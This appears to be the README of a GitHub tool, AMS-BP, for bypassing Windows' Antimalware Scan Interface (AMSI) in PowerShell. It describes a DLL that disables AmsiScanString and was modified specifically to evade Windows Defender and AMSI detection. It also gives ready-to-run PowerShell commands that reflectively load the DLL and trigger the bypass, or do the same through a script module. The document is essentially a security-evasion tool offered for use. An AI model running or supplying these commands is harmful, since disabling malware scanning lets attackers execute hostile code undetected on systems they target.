# AMS-BP https://github.com/Dec0ne/AMS-BP
Bypass Powershell AMSI using a simple script.
This Script is comprised of a DLL (source file included) which when loaded and executed will disable AmsiScanString.
This DLL is based on [CyberArk Post](https://www.cyberark.com/threat-research-blog/amsi-bypass-redux/) with some minor changes to defeat Windows Defender and AMSI itself which now recognizes the strings inside the DLL when it is loaded.

## Usage:
__Using the DLL__
```powershell
PS C:\> [Reflection.Assembly]::Load([IO.File]::ReadAllBytes("$pwd\\Source.dll"))
PS C:\> [BP.AMS]::Disable()
```
__Using the .ps1 script__
```powershell
PS C:\> Import-Module .\AMSBP.ps1
PS C:\> AMSBP
```
